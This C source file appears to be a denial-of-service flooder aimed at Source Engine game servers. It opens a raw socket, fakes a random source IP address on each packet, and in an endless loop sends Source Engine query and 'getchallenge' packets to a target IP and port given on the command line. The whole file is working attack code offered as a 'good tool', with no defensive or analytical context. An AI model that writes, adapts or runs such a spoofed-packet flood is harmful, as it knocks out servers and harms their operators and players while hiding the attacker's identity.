/* My old script is good tool. Sendto query & cookie connect & lost conection packet */


#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>

#define LEN 512
#define MAX 5000


typedef unsigned short u16;
typedef unsigned long u32;


//2nd
unsigned short csum (unsigned short *buf, int nwords);
uint16_t udp_checksum(const struct iphdr  *ip,
        const struct udphdr *udp,
        const uint16_t *buf);
 
int main(int argc, char * argv[])
{
 
    if(argc < 3)
    {
        printf("- Usage %s <IP> <Port>\n", argv[0]);
        exit(1);
    }

 	srand(time(NULL));  
    char * DEST = argv[1];
    int PSOURCE;
    int PDEST = atoi(argv[2]);
    int s;
    struct sockaddr_in daddr, saddr;
    char packet[LEN];
    struct iphdr *ip = (struct iphdr *)packet;  
    struct udphdr *udp = (struct udphdr *)((void *) ip + sizeof(struct iphdr));
    if ((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("error:");
        exit(EXIT_FAILURE);
    }
    daddr.sin_family = AF_INET;
    saddr.sin_family = AF_INET;
    daddr.sin_port = htons(PDEST);
    inet_pton(AF_INET, DEST, (struct in_addr *)&daddr.sin_addr.s_addr);
 
    memset(daddr.sin_zero, 0, sizeof(daddr.sin_zero));
    memset(saddr.sin_zero, 0, sizeof(saddr.sin_zero));
    memset(udp, 0, sizeof(struct udphdr));
    memset(ip, 0, sizeof(struct iphdr));
     ip->ihl = 5; //header length
    ip->version = 4;
    ip->tos = 0;
    ip->id = 0;
    ip->frag_off = 0;  
    ip->ttl = 50 + (rand() % 50);          /* default value */
    ip->protocol = 17;  //IPPROTO_RAW;  /* protocol at L4 */
    ip->check = 0;          /* not needed in iphdr */
    ip->daddr = daddr.sin_addr.s_addr;
    udp->source = htons(PSOURCE);
    int sizedata;
    int sizeudpdata = sizeof(struct udphdr) + 1;
    ip->tot_len = htons(sizeudpdata + sizeof(struct iphdr));    /* 16 byte value */
    udp->len = htons(sizeudpdata);
    int optval = 1;
        udp->dest = htons (PDEST);
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(int)) < 0)    perror ("IP HDRINCL");

        int sizepacket = sizeof(struct iphdr) + sizeudpdata;
       char * packet_pos  = ((void *) udp) + sizeof(struct udphdr);
    sizedata = 25;
    sizeudpdata = sizeof(struct udphdr) + sizedata;
    ip->tot_len = htons(sizeudpdata + sizeof(struct iphdr));    /* 16 byte value */
    udp->len = htons(sizeudpdata);
    sizepacket = sizeof(struct iphdr) + sizeudpdata;

    PSOURCE = 27005;
    udp->source = htons(PSOURCE);
    saddr.sin_port = htons(PSOURCE);
    memcpy(((void *) udp) + sizeof(struct udphdr), (char*)packet_pos, sizedata);
    int style=0;
    while(1)
    {

    char ip_src[20];
//=======================================//
//    printf("%s\n", list[nip]);
    sprintf(ip_src, "%d.%d.%d.%d", 60+(rand()%40),rand()%180, rand()%254,rand()%254);
   // char * SOURCE = list[nip];
    /* point the iphdr to the beginning of the packet */
    inet_pton(AF_INET, ip_src, (struct in_addr *)&saddr.sin_addr.s_addr);
    ip->saddr = saddr.sin_addr.s_addr;
     ip->id = (10000+(rand()%25000));
     ip->ttl = 50+rand()%100;
     style = 1+rand()%5;
     switch(style)
     {
    case 1:
    sizedata = 25;
    sizeudpdata = sizeof(struct udphdr) + sizedata;
    ip->tot_len = htons(sizeudpdata + sizeof(struct iphdr));    /* 16 byte value */
    udp->len = htons(sizeudpdata);
    sizepacket = sizeof(struct iphdr) + sizeudpdata;
    memcpy(((void *) udp) + sizeof(struct udphdr), "\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00", sizedata);
    udp->check = 0;
    udp->check = udp_checksum(ip,udp, (const uint16_t *)udp);
    sendto(s, (char *)packet, sizepacket, 0,(struct sockaddr *)&daddr, (socklen_t)sizeof(daddr)) ;   
    break;
    case 2:
    sizedata = 23;
    sizeudpdata = sizeof(struct udphdr) + sizedata;
    ip->tot_len = htons(sizeudpdata + sizeof(struct iphdr));    /* 16 byte value */
    udp->len = htons(sizeudpdata);
    sizepacket = sizeof(struct iphdr) + sizeudpdata;
    memcpy(((void *) udp) + sizeof(struct udphdr), "\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x76\x61\x6c\x76\x65\x0a", sizedata);
    udp->check = 0;
    udp->check = udp_checksum(ip,udp, (const uint16_t *)udp);
    sendto(s, (char *)packet, sizepacket, 0,(struct sockaddr *)&daddr, (socklen_t)sizeof(daddr)) ;   
    
    break;
    case 3:
    sizedata = 25;
    sizeudpdata = sizeof(struct udphdr) + sizedata;
    ip->tot_len = htons(sizeudpdata + sizeof(struct iphdr));    /* 16 byte value */
    udp->len = htons(sizeudpdata);
    sizepacket = sizeof(struct iphdr) + sizeudpdata;
    memcpy(((void *) udp) + sizeof(struct udphdr), "\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00", sizedata);
    udp->check = 0;
    udp->check = udp_checksum(ip,udp, (const uint16_t *)udp);
    sendto(s, (char *)packet, sizepacket, 0,(struct sockaddr *)&daddr, (socklen_t)sizeof(daddr)) ;   
//========//
    ip->id += 1;
    sizedata = 23;
    sizeudpdata = sizeof(struct udphdr) + sizedata;
    ip->tot_len = htons(sizeudpdata + sizeof(struct iphdr));    /* 16 byte value */
    udp->len = htons(sizeudpdata);
    sizepacket = sizeof(struct iphdr) + sizeudpdata;
    memcpy(((void *) udp) + sizeof(struct udphdr), "\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x76\x61\x6c\x76\x65\x0a", sizedata);
    udp->check = 0;
    udp->check = udp_checksum(ip,udp, (const uint16_t *)udp);
    sendto(s, (char *)packet, sizepacket, 0,(struct sockaddr *)&daddr, (socklen_t)sizeof(daddr)) ;   
//========//
    break;
    case 4:
    ip->id = 0;
//========//
    sizedata = 23;
    sizeudpdata = sizeof(struct udphdr) + sizedata;
    ip->tot_len = htons(sizeudpdata + sizeof(struct iphdr));    /* 16 byte value */
    udp->len = htons(sizeudpdata);
    sizepacket = sizeof(struct iphdr) + sizeudpdata;
    memcpy(((void *) udp) + sizeof(struct udphdr), "\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x76\x61\x6c\x76\x65\x0a", sizedata);
    udp->check = 0;
    udp->check = udp_checksum(ip,udp, (const uint16_t *)udp);
    sendto(s, (char *)packet, sizepacket, 0,(struct sockaddr *)&daddr, (socklen_t)sizeof(daddr)) ;   
//========//
    ip->id += 1;
    sizedata = 9;
    sizeudpdata = sizeof(struct udphdr) + sizedata;
    ip->tot_len = htons(sizeudpdata + sizeof(struct iphdr));    /* 16 byte value */
    udp->len = htons(sizeudpdata);
    sizepacket = sizeof(struct iphdr) + sizeudpdata;
    memcpy(((void *) udp) + sizeof(struct udphdr), "\xff\xff\xff\xff\x55\xff\xff\xff\xff", sizedata);
    udp->check = 0;
    udp->check = udp_checksum(ip,udp, (const uint16_t *)udp);
    sendto(s, (char *)packet, sizepacket, 0,(struct sockaddr *)&daddr, (socklen_t)sizeof(daddr)) ;   
    break;

    default:
    sizedata = 25;
    sizeudpdata = sizeof(struct udphdr) + sizedata;
    ip->tot_len = htons(sizeudpdata + sizeof(struct iphdr));    /* 16 byte value */
    udp->len = htons(sizeudpdata);
    sizepacket = sizeof(struct iphdr) + sizeudpdata;
    memcpy(((void *) udp) + sizeof(struct udphdr), "\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00", sizedata);
    udp->check = 0;
    udp->check = udp_checksum(ip,udp, (const uint16_t *)udp);
    sendto(s, (char *)packet, sizepacket, 0,(struct sockaddr *)&daddr, (socklen_t)sizeof(daddr)) ;   
    ip->id += 1;
    udp->check = 0;
    udp->check = udp_checksum(ip,udp, (const uint16_t *)udp);
    sendto(s, (char *)packet, sizepacket, 0,(struct sockaddr *)&daddr, (socklen_t)sizeof(daddr)) ;   
    break;
    }
}
    close(s);   
    exit(EXIT_SUCCESS);
}
 

struct pseudo_hdr {
    u_int32_t source;
    u_int32_t dest;
    u_int8_t zero; 
    u_int8_t protocol;
    u_int16_t udp_length;
};
 
uint16_t udp_checksum(const struct iphdr  *ip,
        const struct udphdr *udp,
        const uint16_t *buf)
{
 
    int calculated_length = ntohs(udp->len)%2 == 0 ? ntohs(udp->len) : ntohs(udp->len) + 1;
 
    struct pseudo_hdr ps_hdr = {0};
    bzero (&ps_hdr, sizeof(struct pseudo_hdr));
    uint8_t data[sizeof(struct pseudo_hdr) + calculated_length];
    bzero (data, sizeof(struct pseudo_hdr) + calculated_length );
 
    ps_hdr.source = ip->saddr;
    ps_hdr.dest = ip->daddr;
    ps_hdr.protocol = IPPROTO_UDP; //17
    ps_hdr.udp_length = udp->len;
 
    memcpy(data, &ps_hdr, sizeof(struct pseudo_hdr));
    memcpy(data + sizeof(struct pseudo_hdr), buf, ntohs(udp->len) ); //the remaining bytes are set to 0
 
    return csum((uint16_t *)data, sizeof(data)/2);
}
 
/* Not my code */
unsigned short csum (unsigned short *buf, int nwords)
{
    unsigned long sum;
 
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
 
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return ~sum;
}



